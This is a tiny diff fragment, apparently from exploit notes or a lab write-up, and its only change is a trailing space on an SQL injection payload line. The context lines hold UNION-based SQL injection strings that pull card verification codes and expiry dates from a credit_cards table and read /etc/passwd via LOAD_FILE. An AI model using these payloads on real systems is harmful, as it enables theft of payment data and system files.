@@ -57,5 +57,5 @@ sys.stdout.buffer.write(payload)
 ' union select null, ccv, expiration,null,null,null,null from credit_cards where ccnumber=1234567812345678 -- 
 ```
 ```commandline
-' union select null, LOAD_FILE('/etc/passwd'), null,null,null,null,null from credit_cards where ccnumber=1234567812345678 --
+' union select null, LOAD_FILE('/etc/passwd'), null,null,null,null,null from credit_cards where ccnumber=1234567812345678 -- 
 ```
